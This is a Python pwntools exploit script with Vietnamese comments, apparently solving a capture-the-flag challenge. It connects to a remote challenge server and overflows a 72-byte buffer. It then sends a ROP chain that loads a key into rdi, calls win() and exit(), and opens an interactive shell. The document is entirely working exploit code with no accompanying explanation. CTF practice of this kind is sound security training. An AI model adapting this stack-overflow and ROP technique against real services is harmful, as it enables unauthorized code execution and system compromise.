from pwn import *

# Cài đặt context cho file binary
context.binary = elf = ELF('./chall')
context.log_level = 'info'
context.timeout = 5

# Thay đổi thông tin kết nối tại đây
# p = process()
p = remote("0.cloud.chals.io", 31984)

# Lấy các địa chỉ cần thiết
win_addr = elf.symbols['win']
key = 0xdeadbeefcafebabe

# --- PHẦN SỬA LỖI ---
# Tìm địa chỉ của exit trong bảng biểu tượng chung (.symbols) thay vì PLT (.plt)
try:
    exit_addr = elf.symbols['exit']
except KeyError:
    log.error("Could not find 'exit' in the symbol table. The binary might be stripped or compiled differently.")
    exit()

# Tìm kiếm các gadget cần thiết
log.info("Searching for ROP gadgets...")
rop = ROP(elf)
try:
    pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]
    log.info(f"Found 'win' function at: {hex(win_addr)}")
    log.info(f"Found 'exit' function at: {hex(exit_addr)}")
    log.info(f"Found 'pop rdi; ret' gadget at: {hex(pop_rdi_ret_gadget)}")
    log.info(f"Found 'ret' gadget for stack alignment at: {hex(ret_gadget)}")
except IndexError:
    log.error("Could not find a required ROP gadget. Exiting.")
    exit()

# Offset
offset = 72
junk = b'A' * offset

# Xây dựng ROP chain cuối cùng
rop_chain = p64(ret_gadget)          # Căn chỉnh stack
rop_chain += p64(pop_rdi_ret_gadget) # Chuẩn bị gọi hàm với 1 tham số
rop_chain += p64(key)                # Tham số cho win()
rop_chain += p64(win_addr)           # Gọi win()
rop_chain += p64(exit_addr)          # Gọi exit() để kết thúc sạch sẽ

# Tạo payload cuối cùng
payload = junk + rop_chain

# Gửi payload sau khi nhận được prompt
p.sendlineafter(b"Say something:\n", payload)

# Chuyển sang chế độ tương tác để nhận shell
log.info("Payload sent! Enjoy your shell!")
p.interactive()